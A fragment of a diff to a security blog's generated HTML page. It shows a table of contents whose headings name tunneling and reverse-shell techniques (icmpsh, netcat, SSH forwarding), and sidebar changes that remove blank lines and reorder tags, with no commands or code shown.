class="toc-text">icmpsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pingtunnel"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">pingtunnel</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82"><span class="toc-number">2.2.</span> <span class="toc-text">传输层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">1.端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">2.netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="toc-number">2.2.0.2.1.</span> <span class="toc-text">获得shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8pyhton%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.1.</span> <span class="toc-text">1.用pyhton反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#php%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.2.</span> <span class="toc-text">2.php反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#perl%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.3.</span> <span class="toc-text">3.perl反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.0.2.1.4.</span> <span class="toc-text">4.bash反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powercat"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">3.Powercat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">正向链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">反向链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82"><span class="toc-number">2.3.</span> <span class="toc-text">应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">1.本地转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">2.远程转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">3.动态转发</span></a></li></ol></li></ol></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1249,506 +1257,6 @@
         
         
         
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
     
     
     
@@ -1787,7 +1295,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">07/10</span>
-            <a class="archive-post-title" href="/2022/07/10/2022-7-10-oslab/">MIT6.S081_Lab</a>
+            <a class="archive-post-title" href="/2022/07/10/2022-7-10-oslab/">MIT6S081lab</a>
         </li>
     
         
@@ -2209,14 +1717,14 @@
                 Life
             </span>
         
+            <span class="sidebar-tag-name" data-tags="OS">
+                <span class="iconfont-archer">&#xe606;</span>
+                OS
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="PWN">
                 <span class="iconfont-archer">&#xe606;</span>
                 PWN
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="WEB">
-                <span class="iconfont-archer">&#xe606;</span>
-                WEB
             </span>
         
             <span class="sidebar-tag-name" data-tags="RE">
@@ -2229,14 +1737,14 @@
                 BUU刷题
             </span>
         
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="Java">
                 <span class="iconfont-archer">&#xe606;</span>
                 Java
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="免杀">
-                <span class="iconfont-archer">&#xe606;</span>
-                免杀
             </span>
         
             <span class="sidebar-tag-name" data-tags="内网">
@@ -2244,19 +1752,24 @@
                 内网
             </span>
         
+            <span class="sidebar-tag-name" data-tags="免杀">
+                <span class="iconfont-archer">&#xe606;</span>
+                免杀
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="VulnHub">
                 <span class="iconfont-archer">&#xe606;</span>
                 VulnHub
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内核">
-                <span class="iconfont-archer">&#xe606;</span>
-                内核
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="渗透">
                 <span class="iconfont-archer">&#xe606;</span>
                 渗透
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="内核">
+                <span class="iconfont-archer">&#xe606;</span>
+                内核
             </span>
         
             <span class="sidebar-tag-name" data-tags="漏洞复现">
@@ -2277,11 +1790,6 @@
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
